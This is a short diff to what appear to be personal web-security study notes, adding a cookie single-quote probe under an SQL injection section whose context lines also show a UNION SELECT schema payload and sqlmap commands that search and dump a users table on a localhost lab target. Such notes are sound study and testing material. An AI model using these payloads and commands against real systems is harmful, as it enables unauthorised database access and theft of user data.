@@ -143,6 +143,7 @@ SQL Injection:
 	- Retrieve table schema - '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
 	- sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=v5t7jifqq5u6o5r7ndvce9an4f' --search -T users --batch
 	- sqlmap -u 'http://localhost:30000/participants.php?courseid=5' --cookie='PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr' --dump batch 
+	- append a single quote to the value of your TrackingId cookie and send the request: TrackingId=ogAZZfxtOKUELbuJ'
 
 		
 CSRF:
